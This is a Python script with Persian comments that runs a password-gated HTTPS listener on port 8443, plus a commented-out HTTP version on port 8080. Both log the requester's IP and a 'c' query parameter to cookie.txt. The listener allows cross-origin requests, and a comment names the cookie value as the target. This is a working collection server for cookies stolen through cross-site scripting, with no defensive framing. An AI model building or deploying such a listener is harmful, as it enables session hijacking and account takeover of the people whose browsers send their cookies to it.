from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import datetime
import ssl

PASSWORD = "12345"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")  # 👈 مهم
        self.end_headers()

        ip = self.client_address[0]
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)

        if params.get("pass", [""])[0] != PASSWORD:
            self.wfile.write(b"wrong password")
            return

        cookie = params.get("c", [""])[0]
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open("cookie.txt", "a") as f:
            f.write(f"[{now}] {ip} - {cookie}\n")

        self.wfile.write(b"OK")

httpd = HTTPServer(('0.0.0.0', 8443), Handler)

# 👇 اضافه کردن HTTPS با گواهی تستی
import ssl
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print("[*] listening on https port 8443...")
httpd.serve_forever()











# from http.server import BaseHTTPRequestHandler , HTTPServer
# import urllib.parse
# import datetime

# PASSWORD = "12345"

# class Handler(BaseHTTPRequestHandler):
#     def do_GET(self):
#         ip = self.client_address[0]

#         query = urllib.parse.urlparse(self.path).query
#         # ParseResult(
#         #     scheme='',          # پروتکل (مثلاً http)
#         #     netloc='',          # میزبان (مثلاً 153.120.168.59)
#         #     path='/log',        # مسیر
#         #     params='',
#         #     query='c=abc123',   # 🔥 این چیزی هست که می‌خوایم
#         #     fragment=''
#         # )

#         params = urllib.parse.parse_qs(query)
#         # تبدیل به دیگشنری

#         if params.get("pass",[""])[0] != PASSWORD:
#             self.send_response(403)
#             self.end_headers()
#             self.wfile.write(b"wrong password")
#             return
    
#         cookie = params.get("c",[""])[0]

#         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

#         with open("cookie.txt", "a") as f:
#             f.write(f"[{now}] {ip} - {cookie}\n")

#         self.send_response(200)
#         self.end_headers()
#         self.wfile.write(b"OK")

# server = HTTPServer(('0.0.0.0',8080),Handler)
# print("[*] listening on port 8080...")
# server.serve_forever()